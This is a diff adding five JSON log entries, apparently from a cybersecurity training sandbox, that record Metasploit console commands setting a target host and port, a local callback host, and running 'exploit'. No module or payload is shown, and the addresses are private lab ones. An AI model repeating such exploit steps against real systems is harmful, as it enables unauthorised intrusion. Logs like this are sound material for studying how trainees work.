@@ -1,0 +1,5 @@
+{"sandbox_id": "69", "timestamp_str": "2020-07-15T10:12:50.112877+02:00", "cmd_type": "msf-command", "cmd": "set rhost 172.18.1.5"}
+{"sandbox_id": "69", "timestamp_str": "2020-07-15T10:15:28.842846+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "69", "timestamp_str": "2020-07-15T10:15:37.637084+02:00", "cmd_type": "msf-command", "cmd": "exploit"}
+{"sandbox_id": "69", "timestamp_str": "2020-07-15T10:16:38.671624+02:00", "cmd_type": "msf-command", "cmd": "set rport 10000"}
+{"sandbox_id": "69", "timestamp_str": "2020-07-15T10:16:45.960743+02:00", "cmd_type": "msf-command", "cmd": "set lhost"}
